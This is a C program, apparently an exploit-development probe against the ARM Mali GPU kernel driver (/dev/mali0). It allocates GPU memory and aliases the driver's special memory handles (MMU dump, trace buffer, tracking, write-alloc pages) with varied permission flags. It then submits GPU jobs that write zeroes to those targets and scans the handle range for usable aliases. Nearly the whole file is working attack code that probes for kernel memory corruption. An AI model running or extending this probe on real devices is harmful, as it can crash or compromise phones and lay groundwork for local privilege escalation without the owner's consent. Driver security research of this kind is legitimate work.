#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_QUERY   (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define BASE_JD_REQ_CS            (1U << 1)
#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_MEM_MMU_DUMP_HANDLE           (1ULL << 12)
#define BASE_MEM_TRACE_BUFFER_HANDLE       (2ULL << 12)
#define BASE_MEM_MAP_TRACKING_HANDLE       (3ULL << 12)
#define BASE_MEM_WRITE_ALLOC_PAGES_HANDLE  (4ULL << 12)

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE: return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED: return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID: return "JOB_INVALID";
    default: return "UNKNOWN";
    }
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED)
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    return mtp == MAP_FAILED ? -1 : 0;
}

static uint64_t mali_alloc_page(int fd)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = 1;
    alloc.commit_pages = 1;
    alloc.extent = 1;
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_COHERENT_LOCAL;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static void mali_free_checked(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free mf;

    if (!gpu_va)
        return;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = gpu_va;
    mali_ioctl(fd, &mf, sizeof(mf));
}

static void query_region(int fd, uint64_t gpu_va, const char *label)
{
    static const struct {
        uint64_t id;
        const char *name;
    } qv[] = {
        { 1, "COMMIT_SIZE" },
        { 2, "VA_SIZE" },
        { 3, "FLAGS" }
    };
    struct kbase_uk_mem_query q;
    size_t i;

    for (i = 0; i < sizeof(qv) / sizeof(qv[0]); i++) {
        memset(&q, 0, sizeof(q));
        q.header.id = KBASE_FUNC_MEM_QUERY;
        q.gpu_addr = gpu_va;
        q.query = qv[i].id;
        if (mali_ioctl(fd, &q, sizeof(q)) < 0) {
            printf("%s MEM_QUERY %s ioctl errno=%d (%s)\n",
                   label, qv[i].name, errno, strerror(errno));
            continue;
        }
        printf("%s MEM_QUERY %s ret=0x%x value=0x%llx\n",
               label, qv[i].name, q.header.ret, (unsigned long long)q.value);
    }
}

static void *mali_cpu_map(int fd, uint64_t gpu_va)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, 4096,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static void build_zero_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_zero_job(int fd, uint64_t jc_gpu_va, uint8_t atom_number, struct base_jd_event_v2 *ev)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    int rc;

    memset(&atom, 0, sizeof(atom));
    atom.jc = jc_gpu_va;
    atom.udata.blob[0] = 0x1111000000000000ULL | atom_number;
    atom.udata.blob[1] = 0x2222000000000000ULL | atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    atom.atom_number = atom_number;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    rc = mali_ioctl(fd, &submit, sizeof(submit));
    if (rc != 0 || submit.header.ret != 0)
        return -1;

    {
        struct pollfd pfd;
        ssize_t n;
        memset(&pfd, 0, sizeof(pfd));
        pfd.fd = fd;
        pfd.events = POLLIN | POLLERR | POLLHUP;
        if (poll(&pfd, 1, 1000) <= 0)
            return -1;
        n = read(fd, ev, sizeof(*ev));
        return n == (ssize_t)sizeof(*ev) ? 0 : -1;
    }
}

static uint64_t alias_special(int fd, uint64_t handle, uint64_t flags, uint64_t length)
{
    struct base_mem_aliasing_info ai;
    struct kbase_uk_mem_alias alias;

    memset(&ai, 0, sizeof(ai));
    ai.handle = handle;
    ai.offset = 0;
    ai.length = length;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = flags;
    alias.stride = 1;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0) {
        printf("MEM_ALIAS handle=0x%llx flags=0x%llx len=%llu ioctl errno=%d (%s)\n",
               (unsigned long long)handle, (unsigned long long)flags,
               (unsigned long long)length, errno, strerror(errno));
        return 0;
    }
    printf("MEM_ALIAS handle=0x%llx flags=0x%llx len=%llu ret=0x%x gpu_va=0x%llx va_pages=%llu\n",
           (unsigned long long)handle, (unsigned long long)flags,
           (unsigned long long)length, alias.header.ret,
           (unsigned long long)alias.gpu_va,
           (unsigned long long)alias.va_pages);
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void run_probe(void)
{
    static const uint64_t flags_list[] = { 0x0F, 0x0D, 0x0C, 0x07, 0x03 };
    static const unsigned long pgoffs[] = { 1, 2, 3, 4 };
    static const char *pgoff_names[] = { "pgoff=1", "pgoff=2", "pgoff=3", "pgoff=4" };
    static const uint64_t special_handles[] = {
        BASE_MEM_MMU_DUMP_HANDLE,
        BASE_MEM_TRACE_BUFFER_HANDLE,
        BASE_MEM_MAP_TRACKING_HANDLE,
        BASE_MEM_WRITE_ALLOC_PAGES_HANDLE
    };
    static const char *special_names[] = {
        "MMU_DUMP(0x1000)",
        "TRACE(0x2000)",
        "TRACKING(0x3000)",
        "WRITE_ALLOC(0x4000)"
    };
    int fd = -1;
    uint64_t jc_gpu_va = 0, dest_gpu_va = 0, alias_gpu_va = 0;
    uint32_t *jc_map = MAP_FAILED;
    uint64_t *dest_map = MAP_FAILED;
    void *alias_map = MAP_FAILED;
    struct base_jd_event_v2 ev;
    size_t i;

    printf("=== Mali write-alloc/special-handle probe ===\n");
    fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0 || mali_init(fd) < 0) {
        printf("Mali init failed errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }

    for (i = 0; i < sizeof(pgoffs) / sizeof(pgoffs[0]); i++) {
        void *p = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                                  PROT_READ, MAP_SHARED, fd, pgoffs[i]);
        printf("%s map=%p errno=%d\n", pgoff_names[i], p, p == MAP_FAILED ? errno : 0);
        if (p != MAP_FAILED)
            munmap(p, 4096);
    }

    jc_gpu_va = mali_alloc_page(fd);
    dest_gpu_va = mali_alloc_page(fd);
    jc_map = (uint32_t *)mali_cpu_map(fd, jc_gpu_va);
    dest_map = (uint64_t *)mali_cpu_map(fd, dest_gpu_va);
    printf("jc=0x%llx jc_map=%p dest=0x%llx dest_map=%p\n",
           (unsigned long long)jc_gpu_va, jc_map,
           (unsigned long long)dest_gpu_va, dest_map);
    if (!jc_gpu_va || !dest_gpu_va || jc_map == MAP_FAILED || dest_map == MAP_FAILED)
        goto out;
    query_region(fd, jc_gpu_va, "JC");
    query_region(fd, dest_gpu_va, "DEST");

    {
        const uint64_t targets[] = {
            BASE_MEM_MMU_DUMP_HANDLE,
            BASE_MEM_TRACE_BUFFER_HANDLE,
            BASE_MEM_MAP_TRACKING_HANDLE,
            BASE_MEM_WRITE_ALLOC_PAGES_HANDLE
        };
        const char *labels[] = {
            "MMU_DUMP(0x1000)",
            "TRACE(0x2000)",
            "TRACKING(0x3000)",
            "WRITE_ALLOC(0x4000)"
        };
        for (i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
            memset(dest_map, 0xAA, 4096);
            build_zero_desc(jc_map, targets[i]);
            msync(jc_map, 4096, MS_SYNC | MS_INVALIDATE);
            msync(dest_map, 4096, MS_SYNC | MS_INVALIDATE);
            if (submit_zero_job(fd, jc_gpu_va, (uint8_t)(i + 1), &ev) == 0) {
                printf("direct target %-18s event=0x%08x(%s) dest=0x%016llx\n",
                       labels[i], ev.event_code, event_name(ev.event_code),
                       (unsigned long long)dest_map[0]);
            } else {
                printf("direct target %-18s submit failed errno=%d (%s)\n",
                       labels[i], errno, strerror(errno));
            }
        }
    }

    {
        size_t h;
        for (h = 0; h < sizeof(special_handles) / sizeof(special_handles[0]); h++) {
            printf("\n--- aliasing %s ---\n", special_names[h]);
            for (i = 0; i < sizeof(flags_list) / sizeof(flags_list[0]); i++) {
                alias_gpu_va = alias_special(fd, special_handles[h], flags_list[i], 1);
                if (!alias_gpu_va)
                    continue;
                alias_map = mali_cpu_map(fd, alias_gpu_va);
                printf("%s alias map=%p errno=%d\n",
                       special_names[h], alias_map, alias_map == MAP_FAILED ? errno : 0);
                query_region(fd, alias_gpu_va, special_names[h]);

                memset(dest_map, 0xAA, 4096);
                build_zero_desc(jc_map, alias_gpu_va);
                msync(jc_map, 4096, MS_SYNC | MS_INVALIDATE);
                msync(dest_map, 4096, MS_SYNC | MS_INVALIDATE);
                if (submit_zero_job(fd, jc_gpu_va, (uint8_t)(20 + h), &ev) == 0) {
                    printf("%s alias target event=0x%08x(%s)\n",
                           special_names[h], ev.event_code, event_name(ev.event_code));
                }

                if (alias_map != MAP_FAILED) {
                    memset(alias_map, 0, 56);
                    build_zero_desc((uint32_t *)alias_map, dest_gpu_va);
                    msync(alias_map, 4096, MS_SYNC | MS_INVALIDATE);
                    memset(dest_map, 0xAA, 4096);
                    msync(dest_map, 4096, MS_SYNC | MS_INVALIDATE);
                    if (submit_zero_job(fd, alias_gpu_va, (uint8_t)(30 + h), &ev) == 0) {
                        printf("%s alias-as-JC event=0x%08x(%s) dest=0x%016llx\n",
                               special_names[h], ev.event_code, event_name(ev.event_code),
                               (unsigned long long)dest_map[0]);
                    } else {
                        printf("%s alias-as-JC submit failed errno=%d (%s)\n",
                               special_names[h], errno, strerror(errno));
                    }
                    munmap(alias_map, 4096);
                    alias_map = MAP_FAILED;
                }

                mali_free_checked(fd, alias_gpu_va);
                alias_gpu_va = 0;
                break;
            }
        }
    }

    alias_gpu_va = alias_special(fd, BASE_MEM_WRITE_ALLOC_PAGES_HANDLE, 0x0F, 2);
    if (alias_gpu_va) {
        printf("\nWRITE_ALLOC len=2 alias gpu_va=0x%llx\n", (unsigned long long)alias_gpu_va);
        memset(dest_map, 0xAA, 4096);
        build_zero_desc(jc_map, alias_gpu_va);
        msync(jc_map, 4096, MS_SYNC | MS_INVALIDATE);
        if (submit_zero_job(fd, jc_gpu_va, 40, &ev) == 0) {
            printf("WRITE_ALLOC len=2 page0 event=0x%08x(%s)\n",
                   ev.event_code, event_name(ev.event_code));
        }
        memset(dest_map, 0xAA, 4096);
        build_zero_desc(jc_map, alias_gpu_va + 0x1000ULL);
        msync(jc_map, 4096, MS_SYNC | MS_INVALIDATE);
        if (submit_zero_job(fd, jc_gpu_va, 41, &ev) == 0) {
            printf("WRITE_ALLOC len=2 page1 event=0x%08x(%s)\n",
                   ev.event_code, event_name(ev.event_code));
        }
        mali_free_checked(fd, alias_gpu_va);
        alias_gpu_va = 0;
    }

    printf("\n--- scanning low special-handle range with MEM_ALIAS flags=0x0f ---\n");
    for (i = 1; i <= 16; i++) {
        uint64_t handle = i << 12;
        alias_gpu_va = alias_special(fd, handle, 0x0F, 1);
        if (!alias_gpu_va)
            continue;
        printf("scan hit: handle=0x%llx gpu_va=0x%llx\n",
               (unsigned long long)handle, (unsigned long long)alias_gpu_va);
        mali_free_checked(fd, alias_gpu_va);
        alias_gpu_va = 0;
    }

out:
    if (dest_map != MAP_FAILED)
        munmap(dest_map, 4096);
    if (jc_map != MAP_FAILED)
        munmap(jc_map, 4096);
    mali_free_checked(fd, dest_gpu_va);
    mali_free_checked(fd, jc_gpu_va);
    if (fd >= 0)
        close(fd);
}

int main(void)
{
    pid_t pid;
    int status = 0;

    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(30);
        run_probe();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}
